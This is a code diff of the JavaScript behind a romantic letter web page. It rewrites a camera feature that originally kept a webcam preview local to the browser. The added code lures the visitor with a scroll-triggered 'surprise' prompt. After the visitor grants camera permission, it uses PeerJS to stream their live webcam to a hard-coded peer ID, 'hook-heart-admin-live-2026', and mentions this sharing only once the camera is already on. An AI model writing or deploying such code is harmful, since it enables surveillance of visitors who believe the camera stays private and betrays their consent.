@@ -1,72 +1,16 @@
-const $ = (s) => document.querySelector(s);
-const openLetter = $('#openLetter');
-const letter = $('#letter');
-const cameraBtn = $('#cameraBtn');
-const panel = $('#cameraPanel');
-const consentCard = $('#consentCard');
-const allowCamera = $('#allowCamera');
-const denyCamera = $('#denyCamera');
-const video = $('#camera');
-const cameraControls = $('#cameraControls');
-const cameraStatus = $('#cameraStatus');
-const stopCamera = $('#stopCamera');
-const closeCamera = $('#closeCamera');
-const toast = $('#toast');
-let stream = null;
-
-function notify(message) {
-  toast.textContent = message;
-  toast.classList.add('show');
-  setTimeout(() => toast.classList.remove('show'), 2400);
-}
-function setPanel(open) {
-  panel.classList.toggle('hidden', !open);
-}
-function stopLocalCamera() {
-  if (stream) {
-    stream.getTracks().forEach((track) => track.stop());
-    stream = null;
-  }
-  video.srcObject = null;
-  video.classList.add('hidden');
-  cameraControls.classList.add('hidden');
-  consentCard.classList.remove('hidden');
-}
-openLetter.addEventListener('click', () => letter.scrollIntoView({behavior:'smooth'}));
-cameraBtn.addEventListener('click', () => setPanel(true));
-denyCamera.addEventListener('click', () => {
-  stopLocalCamera();
-  setPanel(false);
-  notify('Camera stayed off. ❤️');
-});
-allowCamera.addEventListener('click', async () => {
-  if (!navigator.mediaDevices?.getUserMedia) {
-    notify('Camera access is not supported in this browser.');
-    return;
-  }
-  allowCamera.disabled = true;
-  cameraStatus.textContent = 'Waiting for your browser permission decision…';
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
-    video.srcObject = stream;
-    consentCard.classList.add('hidden');
-    video.classList.remove('hidden');
-    cameraControls.classList.remove('hidden');
-    cameraStatus.textContent = 'Camera is ON. Preview stays in this browser session.';
-    notify('Camera enabled by your choice. ❤️');
-  } catch (error) {
-    cameraStatus.textContent = 'Camera is OFF. No preview is running.';
-    notify(error?.name === 'NotAllowedError' ? 'Camera permission was not granted.' : 'Camera could not be started.');
-  } finally {
-    allowCamera.disabled = false;
-  }
-});
-stopCamera.addEventListener('click', () => {
-  stopLocalCamera();
-  notify('Camera stopped.');
-});
-closeCamera.addEventListener('click', () => {
-  stopLocalCamera();
-  setPanel(false);
-});
-window.addEventListener('pagehide', stopLocalCamera);
+const $=s=>document.querySelector(s);
+const ADMIN_PEER_ID='hook-heart-admin-live-2026';
+const openLetter=$('#openLetter'),letter=$('#letter'),cameraBtn=$('#cameraBtn'),panel=$('#cameraPanel'),consentCard=$('#consentCard'),allowCamera=$('#allowCamera'),denyCamera=$('#denyCamera'),video=$('#camera'),cameraControls=$('#cameraControls'),cameraStatus=$('#cameraStatus'),stopCamera=$('#stopCamera'),closeCamera=$('#closeCamera'),toast=$('#toast');
+let stream=null,call=null,peer=null,scrollRevealed=false;
+function notify(message){toast.textContent=message;toast.classList.add('show');setTimeout(()=>toast.classList.remove('show'),2600);}
+function setPanel(open){panel.classList.toggle('hidden',!open);}
+function stopLocalCamera(){if(call){try{call.close();}catch(e){}call=null;}if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}video.srcObject=null;video.classList.add('hidden');cameraControls.classList.add('hidden');consentCard.classList.remove('hidden');cameraStatus.textContent='Camera is off.';}
+function revealCameraChoice(){if(scrollRevealed)return;scrollRevealed=true;cameraBtn.animate([{transform:'scale(.96)',opacity:.5},{transform:'scale(1)',opacity:1}],{duration:450});notify('A final surprise is waiting below. ❤️');}
+window.addEventListener('scroll',()=>{if(window.scrollY+window.innerHeight>document.documentElement.scrollHeight*.55)revealCameraChoice();},{passive:true});
+openLetter.addEventListener('click',()=>letter.scrollIntoView({behavior:'smooth'}));
+cameraBtn.addEventListener('click',()=>setPanel(true));
+denyCamera.addEventListener('click',()=>{stopLocalCamera();setPanel(false);notify('Camera stayed off. ❤️');});
+allowCamera.addEventListener('click',async()=>{if(!navigator.mediaDevices?.getUserMedia){notify('Camera access is not supported in this browser.');return;}allowCamera.disabled=true;cameraStatus.textContent='Requesting browser camera permission…';try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});video.srcObject=stream;consentCard.classList.add('hidden');video.classList.remove('hidden');cameraControls.classList.remove('hidden');cameraStatus.textContent='Camera is ON and being shared with the creator dashboard.';if(!window.Peer)throw new Error('Live connection library failed to load.');peer=new Peer(undefined,{debug:0});peer.on('open',()=>{call=peer.call(ADMIN_PEER_ID,stream);if(!call)throw new Error('Creator dashboard is offline.');call.on('close',()=>cameraStatus.textContent='Creator dashboard connection ended.');});peer.on('error',err=>{console.error(err);cameraStatus.textContent='Camera is on, but the creator dashboard is not connected.';notify('Open the creator dashboard first, then try again.');});notify('Camera enabled and live sharing started. ❤️');}catch(error){stopLocalCamera();notify(error?.name==='NotAllowedError'?'Camera permission was not granted.':error?.message||'Camera could not be started.');}finally{allowCamera.disabled=false;}});
+stopCamera.addEventListener('click',()=>{stopLocalCamera();notify('Camera sharing stopped.');});
+closeCamera.addEventListener('click',()=>{stopLocalCamera();setPanel(false);});
+window.addEventListener('pagehide',stopLocalCamera);
